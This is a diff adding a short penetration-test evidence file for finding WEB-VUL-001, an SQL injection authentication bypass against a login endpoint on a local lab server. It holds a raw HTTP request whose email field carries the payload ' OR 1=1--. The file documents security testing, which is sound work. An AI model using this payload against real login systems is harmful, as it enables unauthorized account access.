@@ -1,0 +1,10 @@
+# Evidence ID: EVD-V1-REQ
+# Finding: WEB-VUL-001 (SQL Injection – Authentication Bypass)
+# Date: 2026-10-03T19:33:59+05:30
+# Target: POST http://127.0.0.1:3000/rest/user/login
+# NOTE: lab-only test account payloads; no real credentials.
+POST /rest/user/login HTTP/1.1
+Host: 127.0.0.1:3000
+Content-Type: application/json
+
+{"email":"' OR 1=1--","password":"x"}
